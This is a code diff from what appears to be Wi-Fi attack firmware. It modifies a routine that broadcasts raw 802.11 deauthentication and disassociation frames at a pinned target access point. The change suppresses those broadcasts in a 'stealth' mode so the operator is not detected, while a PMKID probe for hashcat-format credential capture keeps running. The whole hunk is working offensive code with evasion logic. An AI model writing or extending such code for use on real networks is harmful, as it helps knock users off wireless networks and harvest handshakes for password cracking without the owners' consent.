@@ -836,10 +836,22 @@ static void kickOnThisChannel() {
             if (memcmp(s_beacons[i].bssid, s_pinBssid, 6) == 0) { seen = true; break; }
         }
         if (!seen) {
-            uint8_t rounds = s_kickBurst ? s_kickBurst : 1;
-            for (uint8_t r = 0; r < rounds; r++) {
-                sendRawMgmt(0xC0, s_pinBssid, s_bcast);
-                sendRawMgmt(0xA0, s_pinBssid, s_bcast);
+            // Pinned target hasn't shown up in any beacon yet. In
+            // STEALTH-like packs (bidirKick=false, authFlood=false) we
+            // MUST NOT broadcast deauth into the void - that would
+            // blow the user's stealth even though we don't even know
+            // the target is on this channel. Same rule as the global
+            // guard in method_porkchop.cpp: "no deauth at all" means
+            // "no deauth at all", even from the sniffer's pinned-fallback
+            // path. PMKID-probe below is fine to keep going (it's not
+            // a deauth), gated on s_pmkidProbe + known SSID.
+            bool pinnedStealth = !s_bidirKick && !s_authFlood;
+            if (!pinnedStealth) {
+                uint8_t rounds = s_kickBurst ? s_kickBurst : 1;
+                for (uint8_t r = 0; r < rounds; r++) {
+                    sendRawMgmt(0xC0, s_pinBssid, s_bcast);
+                    sendRawMgmt(0xA0, s_pinBssid, s_bcast);
+                }
             }
             if (m.probe && s_pmkidProbe && s_pinSsid[0] &&
                 !Hc22000::hasPair(s_pinBssid)) {
